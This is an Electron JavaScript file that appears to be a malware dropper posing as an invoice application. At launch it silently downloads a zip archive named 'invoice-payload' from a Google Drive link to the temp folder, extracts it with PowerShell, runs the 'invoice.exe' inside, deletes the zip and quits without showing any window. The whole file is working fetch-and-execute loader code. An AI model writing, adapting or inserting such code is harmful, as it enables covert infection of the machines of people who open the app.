
const { app, BrowserWindow } = require('electron');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const downloadUrl = 'https://drive.google.com/uc?export=download&id=1S0XZV-ihqUXMKm9P1lfST6jgA9OmWlqh';
const tempDir = app.getPath('temp');
const zipPath = path.join(tempDir, 'invoice-payload.zip');
const extractPath = path.join(tempDir, 'invoice-payload');

function downloadFile(url, dest) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(dest);
        https.get(url, (response) => {
            if (response.statusCode !== 200 && response.statusCode !== 302) {
                reject(`Error downloading file: Status Code ${response.statusCode}`);
                return;
            }

            let finalUrl = response.headers.location || url;

            https.get(finalUrl, (res) => {
                res.pipe(file);
                file.on('finish', () => {
                    file.close(resolve);
                });
            }).on('error', (err) => {
                fs.unlink(dest, () => {});
                reject(err.message);
            });
        }).on('error', (err) => {
            fs.unlink(dest, () => {});
            reject(err.message);
        });
    });
}

function unzipFile(source, destination) {
    return new Promise((resolve, reject) => {
        const command = `Expand-Archive -Path "${source}" -DestinationPath "${destination}" -Force`;
        exec(command, { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
            if (error) {
                reject(`Error extracting file: ${stderr}`);
                return;
            }
            resolve();
        });
    });
}

function runExecutable(exePath) {
    return new Promise((resolve, reject) => {
        exec(`"${exePath}"`, (error, stdout, stderr) => {
            if (error) {
                reject(`Error starting executable: ${stderr}`);
                return;
            }
            resolve();
        });
    });
}

app.on('ready', async () => {
    try {
        await downloadFile(downloadUrl, zipPath);
        await unzipFile(zipPath, extractPath);

        const exePath = path.join(extractPath, 'invoice-win32-x64', 'invoice.exe');
        if (fs.existsSync(exePath)) {
            await runExecutable(exePath);
        } else {
            throw new Error('Executable not found');
        }
    } catch (error) {
        console.error(error);
    } finally {
        if (fs.existsSync(zipPath)) {
            fs.unlinkSync(zipPath);
        }
        app.quit();
    }
});